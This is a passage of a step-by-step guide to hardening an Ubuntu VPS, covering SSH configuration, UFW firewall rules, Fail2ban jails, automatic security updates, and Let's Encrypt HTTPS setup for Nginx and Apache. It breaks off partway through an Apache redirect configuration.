# Ubuntu VPS Security Hardening Guide
## Comprehensive Production Deployment Security Guide

---

## Table of Contents
1. [Initial Ubuntu Server Setup](#1-initial-ubuntu-server-setup)
2. [Creating a Secure Non-Root User](#2-creating-a-secure-non-root-user)
3. [SSH Hardening](#3-ssh-hardening)
4. [Firewall Setup (UFW)](#4-firewall-setup-ufw)
5. [Fail2ban Configuration](#5-fail2ban-configuration)
6. [Automatic Security Updates](#6-automatic-security-updates)
7. [SSL/HTTPS Setup with Let's Encrypt](#7-ssl-https-setup-with-lets-encrypt)
8. [Web Server Security](#8-web-server-security)
9. [Common Attack Vectors & Prevention](#9-common-attack-vectors-and-prevention)
10. [Monitoring and Logging Best Practices](#10-monitoring-and-logging-best-practices)

---

## 1. Initial Ubuntu Server Setup

### Core Security Principles
- **Minimize attack surface**: Only install and run what you need
- **Least privilege**: Give minimum necessary permissions
- **Defense in depth**: Layer multiple security controls
- **Comprehensive logging**: Monitor everything useful
- **Assume breach**: Plan for compromise scenarios

### First Steps After Server Provisioning

#### Update System Packages
```bash
# Update package lists and upgrade all packages
sudo apt update
sudo apt upgrade -y

# Install security updates
sudo apt dist-upgrade -y

# Remove unnecessary packages
sudo apt autoremove -y
sudo apt autoclean
```

#### Set System Hostname
```bash
# Set a meaningful hostname
sudo hostnamectl set-hostname your-server-name

# Verify hostname
hostnamectl
```

#### Configure Timezone
```bash
# List available timezones
timedatectl list-timezones

# Set timezone (example: UTC)
sudo timedatectl set-timezone UTC

# Verify
timedatectl
```

#### Disable Root Login (After Creating Sudo User)
```bash
# Edit SSH config (covered in detail in SSH Hardening section)
sudo nano /etc/ssh/sshd_config

# Set: PermitRootLogin no
```

---

## 2. Creating a Secure Non-Root User

### Why This Matters
Never login as root. Using sudo greatly enhances security by:
- Preventing sharing root password with other users
- Creating audit trails of privileged actions
- Reducing accidental system damage
- Limiting attack surface if credentials are compromised

### Create New User with Sudo Privileges

```bash
# Create new user (replace 'username' with your desired username)
sudo adduser username

# Add user to sudo group
sudo usermod -aG sudo username

# Verify user is in sudo group
groups username
```

### Test Sudo Access
```bash
# Switch to new user
su - username

# Test sudo access
sudo whoami
# Should return: root

# Test with apt update
sudo apt update
```

### Secure User Password
```bash
# Enforce strong password policy
sudo apt install libpam-pwquality -y

# Edit password quality requirements
sudo nano /etc/security/pwquality.conf

# Recommended settings:
# minlen = 14
# dcredit = -1  # At least one digit
# ucredit = -1  # At least one uppercase
# lcredit = -1  # At least one lowercase
# ocredit = -1  # At least one special character
```

### Configure Password Aging
```bash
# Edit login.defs
sudo nano /etc/login.defs

# Set password aging policies:
PASS_MAX_DAYS   90
PASS_MIN_DAYS   1
PASS_WARN_AGE   7
```

### Set Up User SSH Keys (Before Disabling Password Auth)
```bash
# On your LOCAL machine, generate SSH key pair
ssh-keygen -t ed25519 -C "your_email@example.com"
# Or for RSA: ssh-keygen -t rsa -b 4096 -C "your_email@example.com"

# Copy public key to server
ssh-copy-id username@your_server_ip

# Test SSH key authentication
ssh username@your_server_ip
```

---

## 3. SSH Hardening

### Critical Importance
SSH is your lifeline for remote management. Securing it is the highest priority. SSH runs on default port 22, which is constantly targeted by automated attacks.

### WARNING: Test Before Locking Yourself Out
- NEVER close your current SSH session before testing new settings
- Keep one session open while testing in a second session
- Ensure SSH keys work before disabling password authentication
- Have a backup access method (console access via hosting provider)

### Generate and Deploy SSH Keys

#### On Local Machine
```bash
# Generate ED25519 key (recommended - stronger and faster)
ssh-keygen -t ed25519 -C "your_email@example.com"

# Or generate RSA key (4096 bits minimum)
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"

# Save to default location: ~/.ssh/id_ed25519 or ~/.ssh/id_rsa
# Set a strong passphrase for additional security
```

#### Deploy Public Key to Server
```bash
# Method 1: Using ssh-copy-id (easiest)
ssh-copy-id username@your_server_ip

# Method 2: Manual copy
cat ~/.ssh/id_ed25519.pub | ssh username@your_server_ip "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

# Set correct permissions on server
ssh username@your_server_ip
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

### SSH Configuration Hardening

#### Backup Original Config
```bash
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup.$(date +%Y%m%d)
```

#### Edit SSH Configuration
```bash
sudo nano /etc/ssh/sshd_config
```

#### Recommended Security Settings
```bash
# Change default SSH port (reduces automated attacks)
Port 2222  # Choose any port between 1024-65535

# Disable root login
PermitRootLogin no

# Enable public key authentication
PubkeyAuthentication yes

# Disable password authentication (ONLY after testing key auth)
PasswordAuthentication no
PermitEmptyPasswords no
ChallengeResponseAuthentication no

# Disable keyboard-interactive authentication
KbdInteractiveAuthentication no

# Limit authentication attempts
MaxAuthTries 3
MaxSessions 2

# Set login grace time
LoginGraceTime 30

# Allow only specific users (optional but recommended)
AllowUsers username

# Or allow only specific groups
# AllowGroups sshusers

# Disable X11 forwarding (unless needed)
X11Forwarding no

# Disable TCP forwarding (unless needed)
AllowTcpForwarding no

# Use only strong key exchange algorithms
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512

# Use only strong ciphers
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr

# Use only strong MACs
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-256

# Protocol version
Protocol 2

# Host key algorithms (prefer Ed25519)
HostKey /etc/ssh/ssh_host_ed25519_key
HostKey /etc/ssh/ssh_host_rsa_key

# Logging
SyslogFacility AUTH
LogLevel VERBOSE

# Client connection settings
ClientAliveInterval 300
ClientAliveCountMax 2

# Banner (optional - security through obscurity)
# Banner /etc/ssh/banner
```

#### Ubuntu Cloud Image Override Warning
Ubuntu cloud images may create override files in `/etc/ssh/sshd_config.d/` that can override your main config:

```bash
# Check for override files
ls -la /etc/ssh/sshd_config.d/

# Common override file to check
sudo nano /etc/ssh/sshd_config.d/50-cloud-init.conf

# If it exists and conflicts with your settings, comment out or modify
```

#### Test and Apply Configuration
```bash
# Test SSH configuration for syntax errors
sudo sshd -t

# If no errors, restart SSH service
sudo systemctl restart sshd

# Check SSH status
sudo systemctl status sshd
```

#### Test SSH Access (DO THIS BEFORE CLOSING YOUR CURRENT SESSION)
```bash
# In a NEW terminal window, test SSH connection
ssh -p 2222 username@your_server_ip

# If using key authentication works, proceed
# If it fails, fix the issue before closing your original session
```

### Additional SSH Security Measures

#### Install and Configure SSH Key-Only Access
```bash
# Create SSH banner (optional)
sudo nano /etc/ssh/banner

# Add warning message:
# "Unauthorized access is prohibited. All connections are monitored and logged."

# Enable in sshd_config:
# Banner /etc/ssh/banner
```

#### Two-Factor Authentication (Optional but Recommended)
```bash
# Install Google Authenticator
sudo apt install libpam-google-authenticator -y

# Run setup for your user
google-authenticator

# Follow prompts:
# - Time-based tokens: Yes
# - Update .google_authenticator: Yes
# - Disallow multiple uses: Yes
# - Increase window: No
# - Rate limiting: Yes

# Edit PAM config
sudo nano /etc/pam.d/sshd

# Add at the top:
auth required pam_google_authenticator.so

# Edit sshd_config
sudo nano /etc/ssh/sshd_config

# Add or modify:
ChallengeResponseAuthentication yes
AuthenticationMethods publickey,keyboard-interactive

# Restart SSH
sudo systemctl restart sshd
```

---

## 4. Firewall Setup (UFW)

### UFW Overview
UFW (Uncomplicated Firewall) provides a user-friendly interface for iptables. It follows the principle of least privilege: deny all incoming traffic by default, allow only what's necessary.

### Core Security Principle
Default deny incoming, default allow outgoing, explicitly allow only required services.

### Installation
```bash
# UFW is usually pre-installed on Ubuntu, but if not:
sudo apt install ufw -y
```

### Configure Default Policies
```bash
# Set default policies BEFORE enabling UFW
sudo ufw default deny incoming
sudo ufw default allow outgoing

# For high-security environments, deny outgoing too:
# sudo ufw default deny outgoing
# Then explicitly allow required outbound connections
```

### Allow Essential Services BEFORE Enabling UFW

#### CRITICAL: Allow SSH First (Prevent Lockout)
```bash
# If using default SSH port 22:
sudo ufw allow OpenSSH

# If you changed SSH port (e.g., to 2222):
sudo ufw allow 2222/tcp

# Or with rate limiting (recommended - prevents brute force):
sudo ufw limit 2222/tcp
# This allows max 6 connections from same IP within 30 seconds
```

### Allow Common Services
```bash
# HTTP (port 80)
sudo ufw allow 'Nginx HTTP'
# Or: sudo ufw allow 80/tcp

# HTTPS (port 443)
sudo ufw allow 'Nginx HTTPS'
# Or: sudo ufw allow 443/tcp

# Allow both HTTP and HTTPS with Nginx Full profile
sudo ufw allow 'Nginx Full'

# For Apache:
sudo ufw allow 'Apache Full'

# MySQL (only if remote access needed - NOT recommended)
# sudo ufw allow from trusted_ip to any port 3306

# PostgreSQL (only if remote access needed)
# sudo ufw allow from trusted_ip to any port 5432
```

### Enable IPv6 Support
```bash
# Edit UFW config
sudo nano /etc/default/ufw

# Ensure this is set to yes:
IPV6=yes
```

### Enable UFW
```bash
# Enable firewall
sudo ufw enable

# Verify it's active
sudo ufw status verbose

# Check numbered rules
sudo ufw status numbered
```

### Advanced UFW Rules

#### IP Whitelisting
```bash
# Allow specific IP to SSH
sudo ufw allow from 203.0.113.10 to any port 2222

# Allow IP range (CIDR notation)
sudo ufw allow from 203.0.113.0/24 to any port 2222

# Allow specific IP to specific port
sudo ufw allow from 203.0.113.10 to any port 3306
```

#### Deny Specific IPs
```bash
# Block malicious IP
sudo ufw deny from 198.51.100.50

# Block IP range
sudo ufw deny from 198.51.100.0/24
```

#### Application Profiles
```bash
# List available application profiles
sudo ufw app list

# Get info about specific profile
sudo ufw app info 'Nginx Full'

# Use application profiles
sudo ufw allow 'Nginx Full'
```

#### Port Ranges
```bash
# Allow port range
sudo ufw allow 6000:6007/tcp
sudo ufw allow 6000:6007/udp
```

#### Delete Rules
```bash
# Delete by rule number
sudo ufw status numbered
sudo ufw delete [number]

# Delete by specification
sudo ufw delete allow 80/tcp
```

### UFW Logging and Monitoring
```bash
# Enable logging
sudo ufw logging on

# Set logging level (low, medium, high, full)
sudo ufw logging medium

# View UFW logs
sudo tail -f /var/log/ufw.log

# Or with journalctl
sudo journalctl -u ufw -f
```

### UFW Best Practices
- Always allow SSH before enabling UFW
- Use rate limiting for SSH (`ufw limit` instead of `ufw allow`)
- Use application profiles when available
- Document all custom rules
- Regularly review and audit rules
- Use specific IPs for database access, never allow from anywhere
- Monitor logs for blocked connection attempts
- Test firewall rules after changes

---

## 5. Fail2ban Configuration

### What is Fail2ban?
Fail2ban is an intrusion prevention system that monitors log files for suspicious activity (failed login attempts, brute force attacks, etc.) and automatically blocks IP addresses by updating firewall rules.

### How It Works
1. Monitors log files for patterns (failed logins, 404 errors, etc.)
2. Counts failures from each IP within a time window
3. Bans IPs exceeding the threshold by adding firewall rules
4. Automatically unbans after the ban duration expires

### Installation
```bash
# Update package list
sudo apt update

# Install Fail2ban
sudo apt install fail2ban -y

# Enable Fail2ban to start on boot
sudo systemctl enable fail2ban

# Start Fail2ban
sudo systemctl start fail2ban

# Check status
sudo systemctl status fail2ban
```

### Configuration Structure
- `/etc/fail2ban/jail.conf` - Default configuration (DO NOT EDIT)
- `/etc/fail2ban/jail.local` - Your custom configuration (EDIT THIS)
- `/etc/fail2ban/jail.d/` - Additional jail configurations
- `/etc/fail2ban/filter.d/` - Filter definitions
- `/etc/fail2ban/action.d/` - Action definitions

### Create Custom Configuration
```bash
# Copy default config to local config
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local

# Edit local configuration
sudo nano /etc/fail2ban/jail.local
```

### Basic Configuration Settings

#### Global Settings
```ini
[DEFAULT]
# Ban time in seconds (1 hour = 3600, 1 day = 86400)
bantime = 3600

# Find time window (10 minutes = 600 seconds)
findtime = 600

# Maximum retry attempts before ban
maxretry = 5

# Destination email for notifications
destemail = your-email@example.com
sender = fail2ban@yourdomain.com

# Action to take when ban occurs
# %(action_)s = ban only
# %(action_mw)s = ban and send email with whois
# %(action_mwl)s = ban and send email with whois and log lines
action = %(action_mwl)s

# Ignore own IP (replace with your IP)
ignoreip = 127.0.0.1/8 ::1 YOUR.IP.ADDRESS.HERE
```

### SSH Jail Configuration (Most Important)
```ini
[sshd]
enabled = true
port = 2222  # Change to your SSH port
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
findtime = 600

# For permanent SSH bans (use carefully):
# bantime = -1
```

### Additional Jail Configurations

#### Nginx Protection
```ini
[nginx-http-auth]
enabled = true
port = http,https
filter = nginx-http-auth
logpath = /var/log/nginx/error.log
maxretry = 3
bantime = 3600

[nginx-noscript]
enabled = true
port = http,https
filter = nginx-noscript
logpath = /var/log/nginx/access.log
maxretry = 6
bantime = 3600

[nginx-badbots]
enabled = true
port = http,https
filter = nginx-badbots
logpath = /var/log/nginx/access.log
maxretry = 2
bantime = 86400

[nginx-noproxy]
enabled = true
port = http,https
filter = nginx-noproxy
logpath = /var/log/nginx/access.log
maxretry = 2
bantime = 86400

[nginx-limit-req]
enabled = true
port = http,https
filter = nginx-limit-req
logpath = /var/log/nginx/error.log
maxretry = 10
bantime = 3600
findtime = 600
```

#### Apache Protection
```ini
[apache-auth]
enabled = true
port = http,https
filter = apache-auth
logpath = /var/log/apache2/error.log
maxretry = 3
bantime = 3600

[apache-badbots]
enabled = true
port = http,https
filter = apache-badbots
logpath = /var/log/apache2/access.log
maxretry = 2
bantime = 86400

[apache-noscript]
enabled = true
port = http,https
filter = apache-noscript
logpath = /var/log/apache2/error.log
maxretry = 6
bantime = 3600

[apache-overflows]
enabled = true
port = http,https
filter = apache-overflows
logpath = /var/log/apache2/error.log
maxretry = 2
bantime = 3600
```

### Custom Filter Example (WordPress)
```bash
# Create filter file
sudo nano /etc/fail2ban/filter.d/wordpress.conf
```

```ini
[Definition]
failregex = <HOST>.*POST.*(wp-login\.php|xmlrpc\.php).* 200
ignoreregex =
```

```bash
# Create jail
sudo nano /etc/fail2ban/jail.d/wordpress.conf
```

```ini
[wordpress]
enabled = true
port = http,https
filter = wordpress
logpath = /var/log/nginx/access.log
maxretry = 3
bantime = 3600
findtime = 600
```

### Apply Configuration
```bash
# Test configuration
sudo fail2ban-client -t

# Restart Fail2ban
sudo systemctl restart fail2ban

# Verify it's running
sudo systemctl status fail2ban
```

### Monitoring and Management

#### Check Fail2ban Status
```bash
# Overall status
sudo fail2ban-client status

# Specific jail status (e.g., sshd)
sudo fail2ban-client status sshd

# Get banned IPs
sudo fail2ban-client get sshd banned
```

#### View Fail2ban Logs
```bash
# View Fail2ban log
sudo tail -f /var/log/fail2ban.log

# Search for specific IP
sudo grep "Ban 198.51.100.50" /var/log/fail2ban.log

# View banned IPs
sudo zgrep "Ban" /var/log/fail2ban.log*
```

#### Manual Ban/Unban
```bash
# Ban an IP manually
sudo fail2ban-client set sshd banip 198.51.100.50

# Unban an IP
sudo fail2ban-client set sshd unbanip 198.51.100.50

# Unban all IPs in a jail
sudo fail2ban-client unban --all
```

#### Check UFW/IPTables Integration
```bash
# Fail2ban creates iptables rules
sudo iptables -L -n | grep f2b

# Or check UFW status
sudo ufw status numbered
```

### Best Practices
- Start with moderate settings (bantime=3600, maxretry=5)
- Always add your own IP to ignoreip
- Monitor logs regularly
- Test bans with a different IP/VPS before production
- Use email notifications for critical jails
- Combine with UFW rate limiting
- Regularly review banned IPs
- Keep Fail2ban updated
- Use specific filters for your applications
- Consider permanent bans for repeat offenders

---

## 6. Automatic Security Updates

### Overview
Keeping your system updated is one of the most effective security controls. Ubuntu's unattended-upgrades package automates downloading and installing security updates, reducing the window of exposure to known vulnerabilities.

### Why Automatic Updates Matter
- New vulnerabilities are discovered daily
- Manual updates are often delayed or forgotten
- Zero-day exploits can be mitigated quickly
- Maintains compliance with security standards
- Reduces administrative overhead

### Default Behavior
Ubuntu server is configured by default to download and install security updates automatically every day. However, it's important to verify and optimize this configuration.

### Installation
```bash
# Update package list
sudo apt update

# Install unattended-upgrades (usually pre-installed)
sudo apt install unattended-upgrades apt-listchanges -y

# Install update-notifier-common (needed for auto-reboot feature)
sudo apt install update-notifier-common -y
```

### Initial Configuration
```bash
# Run configuration wizard
sudo dpkg-reconfigure -plow unattended-upgrades

# Answer "Yes" to enable automatic updates
```

### Configuration Files
- `/etc/apt/apt.conf.d/50unattended-upgrades` - Main configuration
- `/etc/apt/apt.conf.d/20auto-upgrades` - Update frequency settings

### Configure Update Behavior

#### Edit 20auto-upgrades
```bash
sudo nano /etc/apt/apt.conf.d/20auto-upgrades
```

```bash
# Download and install updates daily
APT::Periodic::Update-Package-Lists "1";
APT::Periodic::Unattended-Upgrade "1";

# Auto-clean interval (days) - removes downloaded packages
APT::Periodic::AutocleanInterval "7";

# Download upgradable packages automatically
APT::Periodic::Download-Upgradeable-Packages "1";
```

#### Edit 50unattended-upgrades (Advanced Settings)
```bash
sudo nano /etc/apt/apt.conf.d/50unattended-upgrades
```

Key settings to configure:

```bash
// Allowed origins for automatic updates
Unattended-Upgrade::Allowed-Origins {
    "${distro_id}:${distro_codename}";
    "${distro_id}:${distro_codename}-security";
    "${distro_id}ESMApps:${distro_codename}-apps-security";
    "${distro_id}ESM:${distro_codename}-infra-security";
    // Optionally include updates (not just security):
    // "${distro_id}:${distro_codename}-updates";
};

// Package blacklist - packages to never auto-update
Unattended-Upgrade::Package-Blacklist {
    // "nginx";
    // "mysql-server";
    // "postgresql";
};

// Automatically remove unused kernel packages
Unattended-Upgrade::Remove-Unused-Kernel-Packages "true";

// Automatically remove unused dependencies
Unattended-Upgrade::Remove-Unused-Dependencies "true";

// Automatic reboot settings
Unattended-Upgrade::Automatic-Reboot "false";

// For servers with low uptime requirements, enable auto-reboot:
// Unattended-Upgrade::Automatic-Reboot "true";

// Reboot time (if auto-reboot enabled)
Unattended-Upgrade::Automatic-Reboot-Time "03:00";

// Only reboot if no users logged in
Unattended-Upgrade::Automatic-Reboot-WithUsers "false";

// Email notifications
Unattended-Upgrade::Mail "your-email@example.com";

// Email only on errors, or always
Unattended-Upgrade::MailReport "only-on-error";
// Options: "always", "only-on-error", "on-change"

// Automatic reboot for kernel updates (requires restart)
// Unattended-Upgrade::Automatic-Reboot "true";

// Bandwidth limit (KB/s) - useful for production servers
// Acquire::http::Dl-Limit "1000";
```

### Email Notifications Setup
```bash
# Install mail utilities
sudo apt install mailutils -y

# Configure email in 50unattended-upgrades
Unattended-Upgrade::Mail "admin@yourdomain.com";
Unattended-Upgrade::MailReport "only-on-error";
```

### Live Kernel Patching (No Reboot Required)
For critical servers requiring high uptime:

```bash
# Install Ubuntu Livepatch (requires Ubuntu One account)
sudo snap install canonical-livepatch

# Enable with your token
sudo canonical-livepatch enable YOUR_TOKEN_HERE

# Check status
sudo canonical-livepatch status

# Get token from: https://ubuntu.com/security/livepatch
```

### Testing Configuration

#### Perform Dry Run
```bash
# Test without actually installing updates
sudo unattended-upgrades --dry-run --debug

# This shows what would be updated without making changes
```

#### Manual Run
```bash
# Manually trigger unattended-upgrades
sudo unattended-upgrades -d

# Force run
sudo unattended-upgrade --debug --dry-run
```

### Monitoring and Logging

#### Log Files
```bash
# View unattended-upgrades log
sudo tail -f /var/log/unattended-upgrades/unattended-upgrades.log

# View dpkg log (actual package operations)
sudo tail -f /var/log/unattended-upgrades/unattended-upgrades-dpkg.log

# View all upgrades
sudo cat /var/log/apt/history.log
```

#### Check Last Update
```bash
# Check when updates last ran
ls -la /var/lib/apt/periodic/
cat /var/lib/apt/periodic/update-success-stamp

# Check pending updates
sudo apt list --upgradable
```

### Production Server Recommendations

#### High Uptime Requirements
```bash
# Disable auto-reboot
Unattended-Upgrade::Automatic-Reboot "false";

# Use Livepatch for kernel updates
sudo canonical-livepatch enable YOUR_TOKEN

# Schedule manual reboot windows monthly
# Use monitoring to track pending kernel updates
```

#### Medium Uptime Requirements
```bash
# Enable auto-reboot during maintenance window
Unattended-Upgrade::Automatic-Reboot "true";
Unattended-Upgrade::Automatic-Reboot-Time "03:00";  # 3 AM
Unattended-Upgrade::Automatic-Reboot-WithUsers "false";

# Only security updates
# Don't include "-updates" in Allowed-Origins
```

#### Development/Staging Servers
```bash
# More aggressive updates
# Include all updates, not just security
Unattended-Upgrade::Allowed-Origins {
    "${distro_id}:${distro_codename}";
    "${distro_id}:${distro_codename}-security";
    "${distro_id}:${distro_codename}-updates";
};

# Auto-reboot allowed
Unattended-Upgrade::Automatic-Reboot "true";
```

### Manual Update Checks
Even with automatic updates enabled, periodically check manually:

```bash
# Update package lists
sudo apt update

# Check for upgradable packages
sudo apt list --upgradable

# Check for security updates specifically
sudo apt upgrade -s | grep -i security

# Upgrade all packages
sudo apt upgrade -y

# Full distribution upgrade
sudo apt dist-upgrade -y
```

### Monitoring Automatic Updates
```bash
# Create monitoring script
sudo nano /usr/local/bin/check-updates.sh
```

```bash
#!/bin/bash
# Check if automatic updates are working

LOG_FILE="/var/log/unattended-upgrades/unattended-upgrades.log"
LAST_UPDATE=$(stat -c %Y "$LOG_FILE")
CURRENT_TIME=$(date +%s)
DIFF=$((CURRENT_TIME - LAST_UPDATE))
DAYS=$((DIFF / 86400))

if [ $DAYS -gt 2 ]; then
    echo "WARNING: Automatic updates haven't run in $DAYS days"
    exit 1
else
    echo "OK: Last update was $DAYS days ago"
    exit 0
fi
```

```bash
# Make executable
sudo chmod +x /usr/local/bin/check-updates.sh

# Add to cron for daily checks
sudo crontab -e
# Add: 0 9 * * * /usr/local/bin/check-updates.sh
```

### Important Considerations
- **No built-in monitoring**: APT doesn't alert if broken
- **Broken state**: If APT breaks, updates stop silently
- **Manual intervention**: Some updates require manual configuration
- **Testing**: Test updates in staging before production
- **Rollback plan**: Have backups before major updates
- **Database servers**: Consider manual updates for critical databases
- **Application compatibility**: Test app compatibility with updates

### Best Practices
- Enable automatic security updates on all servers
- Use Livepatch for high-uptime servers
- Schedule manual maintenance windows monthly
- Monitor logs for failed updates
- Test updates in staging environments
- Keep blacklist minimal
- Enable email notifications
- Document blacklisted packages and reasons
- Review logs weekly
- Maintain up-to-date backups before updates

---

## 7. SSL/HTTPS Setup with Let's Encrypt

### Overview
Let's Encrypt is a free, automated Certificate Authority that provides TLS/SSL certificates. HTTPS is no longer optional in 2025 - it's expected by browsers and required for security, SEO, and user trust.

### Why HTTPS Matters
- **Encryption**: Protects data in transit from eavesdropping
- **Authentication**: Verifies your site's identity
- **Integrity**: Prevents data tampering
- **SEO**: Google ranks HTTPS sites higher
- **Browser trust**: Modern browsers flag HTTP sites as "Not Secure"
- **PCI compliance**: Required for handling payments
- **User confidence**: Users expect the lock icon

### Prerequisites
```bash
# Domain name pointing to your server (A record)
# DNS propagation completed
# Web server (Nginx or Apache) installed and configured
# Ports 80 and 443 open in firewall

# Verify DNS
nslookup yourdomain.com

# Ensure firewall allows HTTP/HTTPS
sudo ufw allow 'Nginx Full'
# Or for Apache:
# sudo ufw allow 'Apache Full'
```

### Important Limitations
- Let's Encrypt does NOT issue certificates for IP addresses
- Certificates are only for Fully Qualified Domain Names (FQDNs)
- Must have valid DNS A/AAAA record pointing to your server

---

## Installation and Setup

### For Nginx

#### Install Certbot and Nginx Plugin
```bash
# Update package list
sudo apt update

# Install Certbot and Nginx plugin
sudo apt install certbot python3-certbot-nginx -y

# Verify installation
certbot --version
```

#### Verify Nginx Configuration
Before running Certbot, ensure Nginx configuration is correct:

```bash
# Test Nginx configuration
sudo nginx -t

# Ensure your server block has server_name directive
sudo nano /etc/nginx/sites-available/yourdomain.com
```

Required Nginx configuration:
```nginx
server {
    listen 80;
    listen [::]:80;

    server_name yourdomain.com www.yourdomain.com;

    root /var/www/yourdomain.com;
    index index.html index.php;

    location / {
        try_files $uri $uri/ =404;
    }
}
```

#### Enable Site and Reload Nginx
```bash
# Enable site (if not already)
sudo ln -s /etc/nginx/sites-available/yourdomain.com /etc/nginx/sites-enabled/

# Test configuration
sudo nginx -t

# Reload Nginx
sudo systemctl reload nginx
```

#### Obtain SSL Certificate
```bash
# Obtain and install certificate (automatic Nginx configuration)
sudo certbot --nginx -d yourdomain.com -d www.yourdomain.com

# Follow prompts:
# 1. Enter email address (for renewal notifications)
# 2. Agree to Terms of Service: Yes
# 3. Share email with EFF (optional): Your choice
# 4. Redirect HTTP to HTTPS: Choose option 2 (Redirect)
```

#### Manual Nginx Configuration (if needed)
If you prefer manual configuration or Certbot can't auto-configure:

```bash
# Obtain certificate only (no auto-configuration)
sudo certbot certonly --nginx -d yourdomain.com -d www.yourdomain.com

# Manually edit Nginx config
sudo nano /etc/nginx/sites-available/yourdomain.com
```

Complete SSL Nginx configuration:
```nginx
server {
    listen 80;
    listen [::]:80;
    server_name yourdomain.com www.yourdomain.com;

    # Redirect all HTTP to HTTPS
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;

    server_name yourdomain.com www.yourdomain.com;

    # SSL certificate paths
    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;

    # SSL configuration (Mozilla Intermediate)
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;

    # SSL session settings
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
    ssl_session_tickets off;

    # OCSP stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    ssl_trusted_certificate /etc/letsencrypt/live/yourdomain.com/chain.pem;
    resolver 8.8.8.8 8.8.4.4 valid=300s;
    resolver_timeout 5s;

    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    root /var/www/yourdomain.com;
    index index.html index.php;

    location / {
        try_files $uri $uri/ =404;
    }
}
```

```bash
# Test and reload
sudo nginx -t
sudo systemctl reload nginx
```

---

### For Apache

#### Install Certbot and Apache Plugin
```bash
# Update package list
sudo apt update

# Install Certbot and Apache plugin
sudo apt install certbot python3-certbot-apache -y

# Verify installation
certbot --version
```

#### Verify Apache Configuration
```bash
# Ensure Apache virtual host is configured
sudo nano /etc/apache2/sites-available/yourdomain.com.conf
```

Required Apache configuration:
```apache
<VirtualHost *:80>
    ServerName yourdomain.com
    ServerAlias www.yourdomain.com
    ServerAdmin admin@yourdomain.com

    DocumentRoot /var/www/yourdomain.com

    <Directory /var/www/yourdomain.com>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/yourdomain_error.log
    CustomLog ${APACHE_LOG_DIR}/yourdomain_access.log combined
</VirtualHost>
```

#### Enable Site and Modules
```bash
# Enable site
sudo a2ensite yourdomain.com.conf

# Enable required modules
sudo a2enmod ssl
sudo a2enmod rewrite
sudo a2enmod headers

# Test configuration
sudo apache2ctl configtest

# Reload Apache
sudo systemctl reload apache2
```

#### Obtain SSL Certificate
```bash
# Obtain and install certificate (automatic Apache configuration)
sudo certbot --apache -d yourdomain.com -d www.yourdomain.com

# Follow prompts (same as Nginx)
```

Certbot will automatically:
- Create SSL virtual host
- Configure SSL parameters
- Set up redirect from HTTP to HTTPS
- Enable required Apache modules

#### Manual Apache SSL Configuration (if needed)
```bash
# Obtain certificate only
sudo certbot certonly --apache -d yourdomain.com -d www.yourdomain.com

# Edit SSL virtual host
sudo nano /etc/apache2/sites-available/yourdomain.com-le-ssl.conf
```

Complete SSL Apache configuration:
```apache
<IfModule mod_ssl.c>
<VirtualHost *:443>
    ServerName yourdomain.com
    ServerAlias www.yourdomain.com
    ServerAdmin admin@yourdomain.com

    DocumentRoot /var/www/yourdomain.com

    # SSL Configuration
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/yourdomain.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/yourdomain.com/privkey.pem
    Include /etc/letsencrypt/options-ssl-apache.conf

    # Modern SSL settings
    SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1
    SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
    SSLHonorCipherOrder off
    SSLSessionTickets off

    # OCSP Stapling
    SSLUseStapling on
    SSLStaplingCache "shmcb:logs/stapling-cache(150000)"

    # Security Headers
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
    Header always set X-Frame-Options "SAMEORIGIN"
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-XSS-Protection "1; mode=block"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"

    <Directory /var/www/yourdomain.com>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/yourdomain_ssl_error.log
    CustomLog ${APACHE_LOG_DIR}/yourdomain_ssl_access.log combined
</VirtualHost>
</IfModule>

# Redirect HTTP to HTTPS
<VirtualHost *:80>
    ServerName yourdomain.com
    ServerAlias www.yourdomain.com
